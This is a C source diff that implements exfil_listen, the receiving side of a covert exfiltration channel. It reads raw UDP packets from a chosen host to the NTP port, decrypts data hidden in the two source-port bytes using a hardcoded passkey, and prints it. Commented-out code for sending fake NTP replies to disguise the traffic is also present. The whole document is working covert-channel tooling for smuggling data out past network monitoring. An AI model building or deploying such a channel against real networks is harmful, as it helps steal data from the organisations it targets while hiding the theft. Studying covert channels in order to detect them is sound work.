@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
+#include <unistd.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
@@ -10,6 +11,8 @@
 #include "client.h"
 #include "defs.h"
 #include "util.h"
+#include "ntp.h"
+#include "inet.h"
 
 int closing;
 
@@ -121,7 +124,52 @@ int val_port(int port)
 		return 0;
 }
 
-void exfil_listen()
+void exfil_listen(uint32 src_addr)
 {
+	struct udp_dgram packet;
+	int sock;
+	char buf[3];
 
+	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+	if(sock < 0)
+	{
+		perror("receive socket cannot be open. Are you root?");
+		exit(1);
+	}
+
+	while (TRUE)
+	{
+		read(sock, &packet, sizeof(struct udp_dgram));
+		if (packet.ip.saddr == src_addr && packet.udp.dest == htons(PORT_NTP))
+		{
+			if (isReq(packet.data))
+			{
+				char *dec;
+//				uint16 src_port;
+//				uint16 dst_port;
+
+				// Output data
+				buf[0] = ntohs(packet.udp.source) >> 8;
+				buf[1] = ntohs(packet.udp.source);
+				buf[2] = 0;
+
+				dec = decrypt(PASSKEY, buf, 2);
+				memcpy(buf, dec, 2);
+				free(dec);
+
+				printf("%s", buf);
+
+//				src_port = PORT_NTP;
+//				if (keepPort)
+//					dst_port = ntohs(packet.udp.source);
+//				else
+//					dst_port = PORT_NTP;
+//
+//				// Respond with fake NTP
+//				_send(src_addr, src_port, dst_port, FALSE);
+			}
+		}
+	}
+
+	close(sock);
 }
